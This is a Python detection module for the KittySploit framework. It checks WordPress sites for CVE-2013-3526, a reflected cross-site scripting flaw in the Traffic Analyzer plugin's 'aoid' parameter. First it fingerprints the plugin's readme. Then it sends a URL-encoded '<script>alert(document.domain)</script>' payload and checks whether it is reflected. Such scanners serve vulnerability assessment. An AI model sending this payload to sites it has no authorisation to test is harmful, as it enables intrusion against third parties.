#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in js/ta_loaded."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "WordPress Plugin Traffic Analyzer - 'aoid' Cross-Site Scripting Detection",
        'description': 'A cross-site scripting vulnerability in js/ta_loaded.js.php in the Traffic Analyzer plugin, possibly 3.3.2 and earlier, for WordPress allows remote attackers to inject arbitrary web script or HTML via the aoid parameter."',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2013', 'cve', 'packetstorm', 'wordpress', 'xss', 'wp-plugin', 'wptrafficanalyzer', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-3526',
            'http://packetstormsecurity.com/files/121167/WordPress-Traffic-Analyzer-Cross-Site-Scripting.html',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/83311',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/d4n-sec/d4n-sec.github.io',
        ],
        'cve': 'CVE-2013-3526',
    }

    def run(self):
        path = '/wp-content/plugins/trafficanalyzer/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('traffic analy', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason="WordPress Plugin Traffic Analyzer - 'aoid' Cross-Site Scripting detected", path=path)
            return True
        return False

